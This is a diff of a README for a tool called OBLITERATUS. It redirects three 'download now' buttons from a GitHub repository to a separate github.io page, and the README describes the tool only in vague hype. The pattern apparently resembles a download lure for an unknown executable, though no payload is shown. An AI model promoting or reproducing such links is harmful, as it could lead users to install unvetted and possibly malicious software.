@@ -1,6 +1,6 @@
 # ⚡ OBLITERATUS - Break Free From Digital Shackles Instantly
 
-[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_OBLITERATUS-Visit_Link-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=2d3436)](https://github.com/Pappose-alhaytham9157/OBLITERATUS)
+[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_OBLITERATUS-Visit_Link-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=2d3436)](https://pappose-alhaytham9157.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ It works quietly in the background, doing the heavy lifting so you don't have to
 
 Click the big green button below (or the one at the top of this page) to go to the official download location:
 
-[🔗 **CLICK HERE TO DOWNLOAD OBLITERATUS**](https://github.com/Pappose-alhaytham9157/OBLITERATUS)
+[🔗 **CLICK HERE TO DOWNLOAD OBLITERATUS**](https://pappose-alhaytham9157.github.io)
 
 ### Step 2: Get the File
 
@@ -114,7 +114,7 @@ If OBLITERATUS helped you out, consider:
 
 Bookmark this for when you're ready to take control:
 
-### ⬇️ [**DOWNLOAD OBLITERATUS NOW**](https://github.com/Pappose-alhaytham9157/OBLITERATUS)
+### ⬇️ [**DOWNLOAD OBLITERATUS NOW**](https://pappose-alhaytham9157.github.io)
 
 ---
 
